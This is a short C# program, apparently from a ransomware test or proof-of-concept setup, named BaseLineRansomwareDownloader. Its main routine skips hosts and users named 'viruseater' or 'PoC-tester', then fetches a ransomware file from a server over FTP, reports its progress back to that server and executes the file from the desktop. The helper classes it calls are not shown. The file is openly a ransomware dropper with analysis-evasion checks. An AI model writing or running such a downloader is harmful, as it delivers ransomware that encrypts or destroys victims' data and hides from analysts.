using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BaseLineRansomwareDownloader
{
    class Program
    {

        static void Main(string[] args)
        {
            ransomwareDownload();
        }

        //The main process controlling the download
        public static void ransomwareDownload()
        {
            //Ensures that ransomware isn't downloaded and executed on this computer
            if (Environment.MachineName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("viruseater")) return;
            if (Environment.UserName.Contains("PoC-tester")) return;
            Thread.Sleep(2000);

            //Sets the path of the ransomware to the desktop
            serverCommunicator.setRansomwareFilePath();

            //Recieves the ransomware from the server
            serverCommunicator.getBaseRansomware();
            Console.WriteLine(serverCommunicator.getNAMEONTEST());
            Thread.Sleep(100);
            //Install ransomware

            //Posts to the server that the ransomware has been taken by the baseline, this creates the ransomware in the baseline part of the server
            serverCommunicator.postBaseTaken();
            Thread.Sleep(100);

            //Downloads the ransomware
            serverCommunicator.downloadFileFTP();
            Thread.Sleep(100);

            //Posts to the server that it has been fetched by ransomware, this marks the ransomware in the 
            serverCommunicator.postBaseFetched();

            //Starts the ransomware
            programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());


            //Play ransomware
        }
    }
}
